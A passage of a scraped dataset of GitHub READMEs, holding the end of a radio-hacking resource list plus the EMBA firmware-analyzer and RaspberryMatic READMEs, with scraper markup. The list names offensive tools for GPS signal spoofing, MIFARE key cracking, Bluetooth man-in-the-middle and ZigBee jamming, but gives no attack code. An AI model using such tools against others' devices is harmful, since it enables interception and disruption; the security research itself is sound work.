bladerf, hackrf, limesdr, rtl-sdr, sdrplay rsp1 and funcube\nshinysdr:software-defined radio receiver application built on gnu radio with a web-based ui and plugins. in development, usable but incomplete. compatible with rtl-sdr.\nopenwebrx:open source, multi-user sdr receiver software with a web interface.\nluaradio:a lightweight, embeddable software-defined radio framework built on luajit.\nqspectrumanalyzer:spectrum analyzer for multiple sdr platforms (pyqtgraph based gui for soapy_power, hackrf_sweep, rtl_power, rx_power and other backends)\npandwarf:pandwarf: rf analysis -----> tool !!!  with a sub-1 ghz wireless transceiver controlled by a smartphone.\nrpitx:rf transmitter for raspberry pi. rpitx is a radio transmitter for raspberry pi (b, b+, pi2, pi3 and pi zero) that transmits rf directly to gpio. it can handle frequencies from 5 khz up to 500 mhz.\npifm:turning the raspberry pi into an fm transmitter.\nrpidatv:digital television transmitter on raspberry pi.rpidatv is a digital television transmitter for raspberry pi (b,b+,pi2,pi3,pizero) which output directly to gpio.\npsdr:portablesdr - a stand alone hf software defined transciever.\ngr-cc11xx:gnu radio oot module for communicating with ti cc11xx based devices.\nspektrum:spektrum is spectrum analyzer software for use with rtl-sdr.\nopenusrp:using limesdr to simulate usrp b210,openusrp can using limesdr to simulate usrp b210 device\nkalibrate-rtl:gsm frequency scanner and frequency offset calculator use with rtl-sdr devices\nkalibrate-hackrf:kalibrate for hackrf\nkalibrate-bladerf:kalibrate for bladerf\ngnuradio:gnu radio is a free & open-source toolkit for software radio gnuradio.org\nuniversal radio hacker: the universal radio hacker is a software for investigating unknown wireless protocols\ngr-recipes:main gnu radio recipe repository for use with pybombs\ngr-etcetera:this repository stores additional recipes for gnu radio.\nrangenetworks/dev:a collection of tools to make working with the numerous software components as painless as possible.\nopenbts:gsm+gprs radio access network node\nyatebts:yatebts is a software implementation of a gsm/gprs radio access network based on yate and is compatible with both gsm/gprs ss7 map and lte ims core networks integrated in our yateucn unified core network server.\nopenlte: openlte is an open source implementation of the 3gpp lte specifications. the focus is on transmission and reception of the downlink.\nopenbts-umts:3g umts data radio access network node\ncellular infrastructure:this is a group of osmocom programs implementing cellular network infrastructure components for gsm, gprs, edge, umts, hspa, lte and their associated interfaces and protocol stacks. 360 unicorn team's demo\nopenbsc:this is a project aiming to create a free software, (a)gpl-licensed software implementations for the gsm/3gpp protocol stacks and elements.\nosmobts:osmobts is an open source gsm bts (base transceiver station) with a-bis/ip interface.\nsrslte:srslte is a free and open-source lte library for sdr ue and enodeb developed by srs\nsrsue:srsue is a software radio lte ue developed by srs . it is written in c++ and builds upon the srslte library\nsrsgui:srsgui is a free and open-source graphics library for sdr using qt and qwt. the library provides a number of useful plots for graphing real and complex numbers.\nimdea-owl:owl stands for online watcher of lte. imdeaowl is a free and open-source lte control channel decoder developed by imdea networks institute and based on srslte, an lte library for sdr ue and enodeb developed by srs\nopenairinterface:the openairinterface software alliance is a non-profit consortium to develop ecosystem for open source software/hardware development for the core network and both access network and user equipment (eutran) of 3gpp cellular networks.\nopenairinterface5g:openairinterface 5g wireless implementation.\nlte base station software:lteenb allows to build a real 4g lte base station (called an enodeb) using a standard pc and a low cost software radio frontend. all the physical layer and protocol layer processing is done in real time inside the pc, so no dedicated lte hardware is necessary. https://www.amarisoft.com/products-lte-ue-ots-sdr-pcie/#software\nosmocombb: osmocombb is an free software / open source gsm baseband software implementation. it intends to completely replace the need for a proprietary gsm baseband software.\ngr-gsm:gnuradio blocks and tools for receiving gsm transmissions\ngr-lte:the gr-lte project is an open source software package which aims to provide a gnu radio lte receiver to receive, synchronize and decode lte signals.\nlte-cell-scanner:opencl, sdr, tdd/fdd lte cell scanner, full stack from a/d samples to sib asn1 messages decoded in pdsch, (optimized for rtl-sdr hackrf and bladerf board)\ngps-sdr-sim:gps-sdr-sim generates gps baseband signal data streams, which can be converted to rf using software-defined radio (sdr) platforms, such as bladerf, hackrf, and usrp.\ngr-fosphor:gnuradio block for spectrum visualization using gpu\ngr-nordic:gnu radio module and wireshark dissector for the nordic semiconductor nrf24l enhanced shockburst protocol.\ngr-lora:gnu radio oot module implementing the lora phy\ngr-ieee802-11:ieee 802.11 a/g/p transceiver for gnu radio that is fitted for operation with ettus n210s and b210s.\ngr-keyfob:transceiver for hella wireless car key fobs.\ngr-rds:fm rds/tmc transceiver\ngr-radar:gnu radio radar toolbox\ngr-air-modes:gr-air-modes implements a software-defined radio receiver for mode s transponder signals, including ads-b reports from equipped aircraft.\ngr-ais:automatic information system decoder for shipborne position reporting for the gnuradio project\ngr-dvbt:dvb-t implementation in gnuradio\nspectrum_painter:a tool to converts images to iq streams that look like this when viewed in a waterfall plot.\ngr-paint:an ofdm spectrum painter for gnu radio tutorial\ngr-baz:collection of new blocks for gnu radio\nenvironment build tools\nhomebrew:the missing package manager for macos\nmacport:the macports project is an open-source community initiative to design an easy-to-use system for compiling, installing, and upgrading either command-line\npybom:pybombs (python build overlay managed bundle system) is the new gnu radio install management system for resolving dependencies and pulling in out-of-tree projects.\nrfsignal reverse tools\naudacity:audacity\u00ae is free, open source, cross-platform audio software for multi-track recording and editing.\nbaudline:baudline is a time-frequency browser designed for scientific visualization of the spectral domain. signal analysis is performed by fourier, correlation, and raster transforms that create colorful spectrograms with vibrant detail.\ninspectrum:inspectrum is a tool for analysing captured signals, primarily from software-defined radio receivers.\ndspectrum:automated rf/sdr signal analysis [reverse engineering]\nrtl_433:application using librtlsdr to decode the temperature from a wireless temperature sensor\nooktools:on-off keying tools for your sd-arrrr leonjza.github.io\nyoutube video tutorial\nroberto n\u00f3brega: michael ossmann software defined radio with hackrf )https://www.youtube.com/user/liquen17/playlists\nhardware hacking by samy kamkar https://www.youtube.com/user/s4myk\nradio hacking: cars, hardware, and more! - samy kamkar - appsec california 2016 https://www.youtube.com/watch?v=1ripwqjg50c\ngnuradio: grcon [https://www.youtube.com/channel/ucceoapzvedcq4s8y16m7fng] (https://www.youtube.com/channel/ucceoapzvedcq4s8y16m7fng)\nbalint256:gnu radio tutorial series\u3001cyberspectrumhttps://www.youtube.com/user/balint256\ncrazy danish hacker: https://www.youtube.com/channel/uclg0eyjtbazayuz3mhwfbbq/playlists\nettusresearch https://www.youtube.com/user/ettusresearch/feed\nanders brownworth well tempered hackeropenbts https://www.youtube.com/playlist?list=pl892ee6bb9d10192f\ngareth's sdr tutorial https://www.youtube.com/channel/ucyjo5ecrhbwarncsdifffpg\nsoftware defined radio academy https://www.youtube.com/channel/uc1galgaqrkjeelmikcb8pgq\n\u96ea\u78a7 0xroot's sdr hacking https://www.youtube.com/channel/ucvc4stnirjrfoi1ey-0ij2q\n26c3: using openbsc for fuzzing of gsm handsets https://www.youtube.com/watch?v=ogposcdlpfq\n27c3: sms-o-death https://www.youtube.com/watch?v=j-lul3e-upc\n27c3: wideband gsm sniffing https://www.youtube.com/watch?v=fh_fxsr-fhu&feature=youtu.be 28c3: introducing osmo-gmr https://www.youtube.com/watch?v=bsw-v94uzzq&feature=youtu.be\n29c3: further hacks on the calypso platform https://www.youtube.com/watch?v=xfjvcxmpa6c&feature=youtu.be\n[fosdem 2014] osmocom: overview of our sdr projects https://www.youtube.com/watch?v=hskvdga2eqg&feature=youtu.be\nsylvain munaut: osmo-gmr: what's up with sat-phones ?https://www.youtube.com/watch?v=roppoleb6_i&feature=youtu.be\ndeepsec 2010 osmocombb a tool for gsm protocol level security analysis of gsm networkshttps://www.youtube.com/watch?v=9cbjv3ytaqo&feature=youtu.be\ndeepsec 2010: targeted dos attack and various fun with gsm um by sylvain munaut https://www.youtube.com/watch?v=7tc4hd7ckzy&feature=youtu.be\nunicornteam of ir0nsmith http://v.qq.com/vplus/9427cc31bad2413591069f1800862a96\ntwitter&web site\n@rtlsdrblog rtl-sdr.com\nwireless frequency bands: frequency / arfcn caculator for lte, umts, gsm and cdma, and carrier aggregation combination info\n@scateu hackrf.net\n@andrewmohawk andrewmohawk.com\n@bastibl bastibl.net\n@csete oz9aec website\n@samykamkar samy kamkar\n@cn0xroot cn0xroot.com spriteking.com\n@fairwaves fairwaves\n@gareth__ gareth codes\n@mpeg4codec ice9 blog\n@marcnewlin marc newlin\n@drmpegw6rz\n@crazydanehacker crazy danish hacker\njxjputaoshujiao xianjun (bh1rxh)'s tech blog\n@bastillenet bastille\n@embeddedsec\n@radiohacking\n@elasticninja\n@devnulling\n@uber_security\n@tresacton\n@kevin2600\n@be_satcom\n@lucasteske\n@giorgiofox\n@xdzou\n@090h\n@rfspace\n@mobios\n@lambdaprog\nruten.proteus\nnfc&rfid resources\nhardware\nproxmark3:the proxmark3 is a powerful general purpose rfid tool, the size of a deck of cards, designed to snoop, listen and emulate everything from low frequency (125khz) to high frequency (13.56mhz) tags.\nacr122u:\nsoftware\nmiguelbalboa/rfid:arduino library for mfrc522 and other rfid rc522 based modules.\nrfidiot:python rfid / nfc library & tools\nrfidler:rfidler - software defined rfid (lf) reader/writer/emulator\nlibnfc:platform independent near field communication (nfc) library\nmfoc:mifare classic offline cracker\nmfcuk:mifare classic universal toolkit (mfcuk)\ntutorial\ncn0xroot.com\nfreebuf.com\nble resources\nhardware\nubertooth:ubertooth ships with a capable ble (bluetooth smart) sniffer and can sniff some data from basic rate (br) bluetooth classic connections.\nti cc2540:the cc2540 is a cost-effective, low-power, true system-on-chip (soc) for bluetooth low energy applications.\nsoftware\nti packet-sniffer:the smartrf packet sniffer is a pc software application that can display and store radio packets captured by a listening rf device. the capture device is connected to the pc via usb. various rf protocols are supported. http://www.ti.com/tool/packet-sniffer\nlibbtbb:a bluetooth baseband decoding library\ncrackle:crackle exploits a flaw in the ble pairing process that allows an attacker to guess or very quickly brute force the tk (temporary key). with the tk and other data collected from the pairing process, the stk (short term key) and later the ltk (long term key) can be collected.\nspectool:spectools is a set of utilities for using various spectrum analyzer hardware. it supports the suite of wi-spy devices (original, 24x, 24x2, dbx, dbx2, 900, 24i) by metageek llc and the ubertooth. spectools includes userspace drivers for the hardware itself, a graphing ui built gtk and cairo, network protocols for remote device capture, and simple utilities for developing additional tools.\nspectool-web:a web viewer for wispy and ubertooth spectrum data\ngatttool :get started with bluetooth low energy on linux\nhcitool:hcitool is used to configure bluetooth connections and send some spe- cial command to bluetooth devices.\nble-security:bluetooth door hacking scripts that require ubertooth or other devices to passively sniff.\nblesuite: blesuite is a python package that provides an easier way to test bluetooth low energy (ble) device (by ncc group)\nblesuite-cli:blesuite_cli is a command line tool to enable an easier way to test bluetooth low energy (ble) devices\nble-replay:ble-replay is a bluetooth low energy (ble) peripheral assessment tool\nblue-hydra bluetooth device discovery service built on top of the bluez library. bluehydra makes use of ubertooth where available and attempts to track both classic and low energy (le) bluetooth devices over time.\nbtlejuice:btlejuice is a complete framework to perform man-in-the-middle attacks on bluetooth smart devices (also known as bluetooth low energy).\nwireshark:wireshark is the world\u2019s foremost and widely-used network protocol analyzer.\ntutorial\nble hacking\uff1able scan and sniffer withu bertooth-one\nubertooth \u2013 bluetooth sniffing updated for 2014\nspectrum tools and ubertooth one\nble fun with ubertooth: sniffing bluetooth smart and cracking its crypto\nubertooth spectrum analysis (kali/chromebook)\nsniffing/logging your own android bluetooth traffic\ninstalling the ubertooth one on bt5\nzigbee resources\nsoftware\ngr-ieee802-15-4:ieee 802.15.4 zigbee transceiver\nsecbee:secbee is a zigbee security testing tool developed by cognosec. the goal is to enable developers and security testers to test zigbee implementations for security issues.\nzigator security analysis tool for zigbee networks\nlow-cost zigbee selective jamming\n#thanks\naxilirator\n@vileer_com", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000108, "year": null}, {"Unnamed: 0": 119, "autor": 119, "date": null, "content": "EMBA\nThe security analyzer for embedded device firmware\nEMBA is designed as the central firmware analysis tool for penetration testers. It supports the complete security analysis process starting with the firmware extraction process, doing static analysis and dynamic analysis via emulation and finally generating a report. EMBA automatically discovers possible weak spots and vulnerabilities in firmware. Examples are insecure binaries, old and outdated software components, potentially vulnerable scripts or hard-coded passwords. EMBA is a command line tool with the option to generate an easy to use web report for further analysis.\nEMBA combines multiple established analysis tools and can be started with one simple command. Afterwards it tests the firmware for possible security risks and interesting areas for further investigation. No manual installation of all helpers, once the integrated installation script has been executed, you are ready to test your firmware.\nEMBA is designed to assist penetration testers and not as a standalone tool without human interaction. EMBA should provide as much information as possible about the firmware, that the tester can decide on focus areas and is responsible for verifying and interpreting the results.\nLinks to the wiki for more detailed information\nHome\nFeature overview\nInstallation\nUsage\nFAQ\nInstallation\nBefore running EMBA make sure, that you have installed all dependencies with the installation script and met the prerequisites\ngit clone https://github.com/e-m-b-a/emba.git\ncd emba\nsudo ./installer.sh -d\nUsage\nClassic (Docker mode):\nsudo ./emba.sh -l ./log -f /firmware\nProfile support:\nsudo ./emba.sh -l ./log -f /firmware -p ./scan-profiles/default-scan.emba\nDeveloper mode (WARNING: EMBA runs on your host and could harm your host!):\n./emba.sh -l ./log -f ./firmware -D\nWARNING: Before using the developer mode you need a full installation of emba with sudo ./installer.sh -F. This installation mode needs more than 14gig of disk space.\nEMBA supports multiple testing and reporting options. For more details check the wiki.\nGet involved\nThe IoT is growing, the development is ongoing, and there are many new features that we want to add. We welcome pull requests and issues on GitHub.", "link": "https://github.com/e-m-b-a/emba", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "emba\nthe security analyzer for embedded device firmware\nemba is designed as the central firmware analysis -----> tool !!!  for penetration testers. it supports the complete security analysis process starting with the firmware extraction process, doing static analysis and dynamic analysis via emulation and finally generating a report. emba automatically discovers possible weak spots and vulnerabilities in firmware. examples are insecure binaries, old and outdated software components, potentially vulnerable scripts or hard-coded passwords. emba is a command line tool with the option to generate an easy to use web report for further analysis.\nemba combines multiple established analysis tools and can be started with one simple command. afterwards it tests the firmware for possible security risks and interesting areas for further investigation. no manual installation of all helpers, once the integrated installation script has been executed, you are ready to test your firmware.\nemba is designed to assist penetration testers and not as a standalone tool without human interaction. emba should provide as much information as possible about the firmware, that the tester can decide on focus areas and is responsible for verifying and interpreting the results.\nlinks to the wiki for more detailed information\nhome\nfeature overview\ninstallation\nusage\nfaq\ninstallation\nbefore running emba make sure, that you have installed all dependencies with the installation script and met the prerequisites\ngit clone https://github.com/e-m-b-a/emba.git\ncd emba\nsudo ./installer.sh -d\nusage\nclassic (docker mode):\nsudo ./emba.sh -l ./log -f /firmware\nprofile support:\nsudo ./emba.sh -l ./log -f /firmware -p ./scan-profiles/default-scan.emba\ndeveloper mode (warning: emba runs on your host and could harm your host!):\n./emba.sh -l ./log -f ./firmware -d\nwarning: before using the developer mode you need a full installation of emba with sudo ./installer.sh -f. this installation mode needs more than 14gig of disk space.\nemba supports multiple testing and reporting options. for more details check the wiki.\nget involved\nthe iot is growing, the development is ongoing, and there are many new features that we want to add. we welcome pull requests and issues on github.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000119, "year": null}, {"Unnamed: 0": 122, "autor": 122, "date": null, "content": "\u2013 The alternative/free operating system for your HomeMatic CCU\nDeutschsprachiges \ud83c\udde9\ud83c\uddea\ud83c\udde6\ud83c\uddf9\ud83c\udde8\ud83c\udded ReadMe\nRaspberryMatic is a free and non-commercial OpenSource operating system alternative for the CCU3 or ELV Charly smart home central systems to configure and use HomeMatic/BidCos-RF or homematicIP IoT hardware distributed by eQ-3/ELV. RaspberryMatic has the aim to be 100% compatible to a standard HomeMatic CCU control central for a cloud-free use of HomeMatic IoT hardware on freely available single-board-computers (SBC) like a RaspberryPi, ASUS Tinkerboard, Hardkernel ODROID or even as a virtual appliance on modern virtual environments (e.g. vmWare ESXi, Proxmox, VirtualBox, Docker/OCI, Kubernetes/K8s, etc.). On top of that, it provides additional exclusive features on different levels (WebUI, Linux-OS, etc.) to provide users with an enhanced user experience compared to the standard vendor-provided CCU firmware from eQ3/ELV.\nmore...\n\ud83c\udf6a Features\nDue to the used base components, RaspberryMatic is 100% compatibile to the standard CCU control center distributed by eQ3/ELV (CCU2/CCU3). This means, that not only it can use the same HomeMatic/homematicIP IoT hardware like a CCU3 central with the same base version. It also provides the same level of functionality in areas like the WebUI or Add-on compatibility. Furthermore, even system backups are compatible between the two CCU variants, which allows to easily switch between the vendor-provided CCU firmware and this free open-source based CCU system software.\nOn top of that, RaspberryMatic provides a whole bunch of enhancements or even bugfixes in the WebUI or underlying Linux operating system which are either not yet integrated in the official eQ3 CCU firmware or will never be integrated due to the functionality not being commercially interesting enough for eQ3/ELV.\nmore...\n\ud83d\udcbb Requirements\nRaspberryMatic can be directly installed on the following, commercially distributed CCU hardware:\nCCU3, ELV-Charly\n...or on the following self-made hardware systems:\nHardware:\nRaspberryPi\nASUS Tinkerboard\nHardkernel ODROID\nIntel NUC\n...or even as a virtual appliance on the following virtualization environments:\nVirtualization Environment:\nvmWare ESXi\nProxmox Virtual Environment\nOracle VirtualBox\nSynology Virtual Machine Manager\nQNAP VirtualizationStation\nvmWare Workstation Player\nQEmu/KVM\nUNRAID\nXCP-ng/XenServer\nHyperV\nDocker/OCI\nKubernetes/K8s\nHome Assistant\nmore...\n\u2601\ufe0f Quick-Start\nUnder Releases you will find dedicated images/files for each supported target hardware. Such an image is e.g. available as an RaspberryMatic-X.XX.XX.YYYYMMDD-XXX.zip download file. After having unarchived this file you should identify a *.img file which can be \"flashed\" to an adequate target media (sd card, usb-stick, ssd or virtual disk, etc.) using e.g. an imaging tool like Etcher. After having flashed this image on the target media you can then put it into your SBC or CCU3 hardware and boot the system. Depending on the used hardware, RaspberryMatic should then boot-up and try to identify the used HomeMatic/homematicIP RF-Module hardware potentially installed on the GPIO bus of your SBC. If this boot-up is finished, you should be able to access the standard WebUI in your local network by using the address http://homematic-raspi/ in your web browser. Afterwards you should then find yourself in then normal CCU WebUI where you can start configuring/using your HomeMatic/homematicIP IoT hardware.\nmore...\n\ud83d\udcdd Documentation (\ud83c\udde9\ud83c\uddea/\ud83c\uddfa\ud83c\uddf8)\nIntroduction\nRequirements\nFeatures\nLimitations\nLicense and Warranty\nCommercial Distribution\nInstallation\nQuick-Start\nBasic Installation (Hardware)\nCCU3\nELV-Charly\nRaspberryPi\nASUS Tinkerboard\nHardkernel ODROID\nIntel NUC\nBasic Installation (Virtual)\nvmWare ESXi\nProxmox Virtual Environment\nOracle VirtualBox\nSynology Virtual Machine Manager\nQNAP VirtualizationStation\nvmWare Workstation Player\nQEmu/KVM\nUNRAID\nXCP-ng/XenServer\nHyperV\nDocker/OCI\nKubernetes/K8s\nHome Assistant Add-on\nConfiguration Upgrade\nUpgrade from CCU3\nUpgrade from CCU2\nUpgrade from CCU1\nUpgrade to virtual RaspberryMatic\nDeinstallation\nAdministration\nFirmware Update/Upgrade\nBackup/Restore\nSecurity Advices\nCCU-Addon Software\nUsage\nWebUI Usage\nLog-Level setup\nTips&Tricks\nExpert-Features\nWLAN/WiFi Setup\nBluetooth Setup\nLAN-Gateway Mode\nUSV Client/Server Setup\nUSB-Boot Setup\nMonit-WatchDog WebUI\nHB-RF-ETH Setup\nIndividual Diagramm/Backup-Path\nOwn commands during bootup\nSupport, Contributions\nKnown Issues\nRequest Help\nFAQ - Frequently Asked Questions\nReport Issues\nRequest Features\nContributions / Development\n\ud83d\ude0b Support, Contributions\nTo provide general feedback or start discussions, please use either the Discussion fora in this GitHub project or (if you are german speaking) please contribute to the RaspberryMatic fora of the HomeMatic-Forum. If during discussions in these fora a definite and unique feature request or bug has been acknowledged by other RaspberryMatic users, please feel free to open a dedicated feature or bug fixing request in the issue tracker.\nAny contribution in any way is highly welcome. Please feel free to contribute not only by using the official releases. If you have some time and free resources, we welcome any contributing to help to reproduce and perhaps even fixing any open issues in our issue tracker. Also participating in enhancing or fixing the official wiki-based documentation is appreciated. That's why any logged-in GitHub user can directly add and modify any documentation pages in this wiki.\nOn top of that, direct contributions by sending in PullRequests and source code contributions (Bugs, Features, etc.) are welcome. So if someone would like to see a certain feature implemented or bug fixed and has enough free resources and knowhow, please feel free to directly send in PullRequests using Git/GitHub. Please note, however, that any contribution to this open source project have to be in accordance to the Apache-2.0 open source license under which RaspberryMatic itself is developed and distributed. So by sending in PullRequests you will have to acknowledge that you are fine with the license implications of your contributions. Therefore, please refer to CONTRIBUTING as well as reading our CODE OF CONDUCT before you consider contributing to this project in any form.\nmore...\n\ud83d\udcdc Licenses\nThe RaspberryMatic project itself \u2013 the files in this repository \u2013 as well as the downloadable binary images in the Releases section are distributed under conditions of the open source Apache License 2.0 license, if not otherwise stated. RaspberryMatic itself is distributed completly free of charge and without any commercial intension whatsoever. Please note, that on top of the Apache-2.0 license, under which RaspberryMatic itself is distributed, other components (e.g. the underlying Buildroot/Linux Operating System) are distributed under different licenses. E.g. Buildroot/Linux itself is distributed under the GPLv2 which could have other implications when changing source parts or distributing own RaspberryMatic images. Furthermore, the eQ-3 OCCU components RaspberryMatic uses to provide the HomeMatic/homematicIP interconnectivity are re-distributed under the HMSL license terms. Furthermore, the RaspberryMatic logo and all other graphical image files in this repository and the downloadable binary images which are closely linked to this project are copyrighted by its sole authors. Any commercial and non-commercial (re-)use of these graphical image files or use of the RaspberryMatic logo are strictly prohibited when distributing own binary distributions or forked versions of RaspberryMatic.\nDisclaimer of Warranty\nAll project contributors provide RaspberryMatic (and each Contributor provides its Contributions) on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied, including, without limitation, any warranties or conditions of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A PARTICULAR PURPOSE. You are solely responsible for determining the appropriateness of using or redistributing RaspberryMatic and assume any risks associated with Your exercise of permissions under this License.\nmore...\n\ud83d\udcd6 Literature\nIf after reading through this documentatin anyone is still unsure regarding the pros and cons of using RaspberryMatic rather than the standard vendor-provided CCU firmware or if someone would like to read / see more on which additional features RaspberryMatic provides, please see the following list of (mostly german speaking) literature:\nVortragsfolien HomeMatic-Usertreffen 2019\nVortragsfolien HomeMatic-Usertreffen 2018\nVortragsfolien HomeMatic-Usertreffen 2017\nVortragsfolien HomeMatic-Usertreffen 2016\n\ud83d\udc4f Acknowledgements\nIn addition to the whole list of Contributors which have contributed to the success of RaspberryMatic, we would like to explicitly thank the following list of people for their third-party contributions:\nAlexander Reinert (@alexreinert) \u2013 for his low-latency generic_raw_uart kernel module which allows to use the eQ3 distributed RF modules (RPI-RF-MOD, HM-MOD-RPI-PCB) as well as for his HB-RF-USB, HB-RF-USB-2 and HB-RF-ETH open hardware projects providing USB and Ethernet based adapter PCBs to use the eQ3 RF modules with other base interfaces.\n\ud83d\udc6a Authors\nDue to the large number of existing people having contributed to the success of RaspberryMatic, please refer to the Contributors accordingly.\n\ud83d\udea7 ChangeLog\nA detailed list of Changes between individual released versions can be reviewed through the Releases section of this GitHub project.", "link": "https://github.com/jens-maus/RaspberryMatic", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "\u2013 the alternative/free operating system for your homematic ccu\ndeutschsprachiges \ud83c\udde9\ud83c\uddea\ud83c\udde6\ud83c\uddf9\ud83c\udde8\ud83c\udded readme\nraspberrymatic is a free and non-commercial opensource operating system alternative for the ccu3 or elv charly smart home central systems to configure and use homematic/bidcos-rf or homematicip iot hardware distributed by eq-3/elv. raspberrymatic has the aim to be 100% compatible to a standard homematic ccu control central for a cloud-free use of homematic iot hardware on freely available single-board-computers (sbc) like a raspberrypi, asus tinkerboard, hardkernel odroid or even as a virtual appliance on modern virtual environments (e.g. vmware esxi, proxmox, virtualbox, docker/oci, kubernetes/k8s, etc.). on top of that, it provides additional exclusive features on different levels (webui, linux-os, etc.) to provide users with an enhanced user experience compared to the standard vendor-provided ccu firmware from eq3/elv.\nmore...\n\ud83c\udf6a features\ndue to the used base components, raspberrymatic is 100% compatibile to the standard ccu control center distributed by eq3/elv (ccu2/ccu3). this means, that not only it can use the same homematic/homematicip iot hardware like a ccu3 central with the same base version. it also provides the same level of functionality in areas like the webui or add-on compatibility. furthermore, even system backups are compatible between the two ccu variants, which allows to easily switch between the vendor-provided ccu firmware and this free open-source based ccu system software.\non top of that, raspberrymatic provides a whole bunch of enhancements or even bugfixes in the webui or underlying linux operating system which are either not yet integrated in the official eq3 ccu firmware or will never be integrated due to the functionality not being commercially interesting enough for eq3/elv.\nmore...\n\ud83d\udcbb requirements\nraspberrymatic can be directly installed on the following, commercially distributed ccu hardware:\nccu3, elv-charly\n...or on the following self-made hardware systems:\nhardware:\nraspberrypi\nasus tinkerboard\nhardkernel odroid\nintel nuc\n...or even as a virtual appliance on the following virtualization environments:\nvirtualization environment:\nvmware esxi\nproxmox virtual environment\noracle virtualbox\nsynology virtual machine manager\nqnap virtualizationstation\nvmware workstation player\nqemu/kvm\nunraid\nxcp-ng/xenserver\nhyperv\ndocker/oci\nkubernetes/k8s\nhome assistant\nmore...\n\u2601\ufe0f quick-start\nunder releases you will find dedicated images/files for each supported target hardware. such an image is e.g. available as an raspberrymatic-x.xx.xx.yyyymmdd-xxx.zip download file. after having unarchived this file you should identify a *.img file which can be \"flashed\" to an adequate target media (sd card, usb-stick, ssd or virtual disk, etc.) using e.g. an imaging -----> tool !!!  like etcher. after having flashed this image on the target media you can then put it into your sbc or ccu3 hardware and boot the system. depending on the used hardware, raspberrymatic should then boot-up and try to identify the used homematic/homematicip rf-module hardware potentially installed on the gpio bus of your sbc. if this boot-up is finished, you should be able to access the standard webui in your local network by using the address http://homematic-raspi/ in your web browser. afterwards you should then find yourself in then normal ccu webui where you can start configuring/using your homematic/homematicip iot hardware.\nmore...\n\ud83d\udcdd documentation (\ud83c\udde9\ud83c\uddea/\ud83c\uddfa\ud83c\uddf8)\nintroduction\nrequirements\nfeatures\nlimitations\nlicense and warranty\ncommercial distribution\ninstallation\nquick-start\nbasic installation (hardware)\nccu3\nelv-charly\nraspberrypi\nasus tinkerboard\nhardkernel odroid\nintel nuc\nbasic installation (virtual)\nvmware esxi\nproxmox virtual environment\noracle virtualbox\nsynology virtual machine manager\nqnap virtualizationstation\nvmware workstation player\nqemu/kvm\nunraid\nxcp-ng/xenserver\nhyperv\ndocker/oci\nkubernetes/k8s\nhome assistant add-on\nconfiguration upgrade\nupgrade from ccu3\nupgrade from ccu2\nupgrade from ccu1\nupgrade to virtual raspberrymatic\ndeinstallation\nadministration\nfirmware update/upgrade\nbackup/restore\nsecurity advices\nccu-addon software\nusage\nwebui usage\nlog-level setup\ntips&tricks\nexpert-features\nwlan/wifi setup\nbluetooth setup\nlan-gateway mode\nusv client/server setup\nusb-boot setup\nmonit-watchdog webui\nhb-rf-eth setup\nindividual diagramm/backup-path\nown commands during bootup\nsupport, contributions\nknown issues\nrequest help\nfaq - frequently asked questions\nreport issues\nrequest features\ncontributions / development\n\ud83d\ude0b support, contributions\nto provide general feedback or start discussions, please use either the discussion fora in this github project or (if you are german speaking) please contribute to the raspberrymatic fora of the homematic-forum. if during discussions in these fora a definite and unique feature request or bug has been acknowledged by other raspberrymatic users, please feel free to open a dedicated feature or bug fixing request in the issue tracker.\nany contribution in any way is highly welcome. please feel free to contribute not only by using the official releases. if you have some time and free resources, we welcome any contributing to help to reproduce and perhaps even fixing any open issues in our issue tracker. also participating in enhancing or fixing the official wiki-based documentation is appreciated. that's why any logged-in github user can directly add and modify any documentation pages in this wiki.\non top of that, direct contributions by sending in pullrequests and source code contributions (bugs, features, etc.) are welcome. so if someone would like to see a certain feature implemented or bug fixed and has enough free resources and knowhow, please feel free to directly send in pullrequests using git/github. please note, however, that any contribution to this open source project have to be in accordance to the apache-2.0 open source license under which raspberrymatic itself is developed and distributed. so by sending in pullrequests you will have to acknowledge that you are fine with the license implications of your contributions. therefore, please refer to contributing as well as reading our code of conduct before you consider contributing to this project in any form.\nmore...\n\ud83d\udcdc licenses\nthe raspberrymatic project itself \u2013 the files in this repository \u2013 as well as the downloadable binary images in the releases section are distributed under conditions of the open source apache license 2.0 license, if not otherwise stated. raspberrymatic itself is distributed completly free of charge and without any commercial intension whatsoever. please note, that on top of the apache-2.0 license, under which raspberrymatic itself is distributed, other components (e.g. the underlying buildroot/linux operating system) are distributed under different licenses. e.g. buildroot/linux itself is distributed under the gplv2 which could have other implications when changing source parts or distributing own raspberrymatic images. furthermore, the eq-3 occu components raspberrymatic uses to provide the homematic/homematicip interconnectivity are re-distributed under the hmsl license terms. furthermore, the raspberrymatic logo and all other graphical image files in this repository and the downloadable binary images which are closely linked to this project are copyrighted by its sole authors. any commercial and non-commercial (re-)use of these graphical image files or use of the raspberrymatic logo are strictly prohibited when distributing own binary distributions or forked versions of raspberrymatic.\ndisclaimer of warranty\nall project contributors provide raspberrymatic (and each contributor provides its contributions) on an \"as is\" basis, without warranties or conditions of any kind, either express or implied, including, without limitation, any warranties or conditions of title, non-infringement, merchantability, or fitness for a particular purpose. you are solely responsible for determining the appropriateness of using or redistributing raspberrymatic and assume any risks associated with your exercise of permissions under this license.\nmore...\n\ud83d\udcd6 literature\nif after reading through this documentatin anyone is still unsure regarding the pros and cons of using raspberrymatic rather than the standard vendor-provided ccu firmware or if someone would like to read / see more on which additional features raspberrymatic provides, please see the following list of (mostly german speaking) literature:\nvortragsfolien homematic-usertreffen 2019\nvortragsfolien homematic-usertreffen 2018\nvortragsfolien homematic-usertreffen 2017\nvortragsfolien homematic-usertreffen 2016\n\ud83d\udc4f acknowledgements\nin addition to the whole list of contributors which have contributed to the success of raspberrymatic, we would like to explicitly thank the following list of people for their third-party contributions:\nalexander reinert (@alexreinert) \u2013 for his low-latency generic_raw_uart kernel module which allows to use the eq3 distributed rf modules (rpi-rf-mod, hm-mod-rpi-pcb) as well as for his hb-rf-usb, hb-rf-usb-2 and hb-rf-eth open hardware projects providing usb and ethernet based adapter pcbs to use the eq3 rf 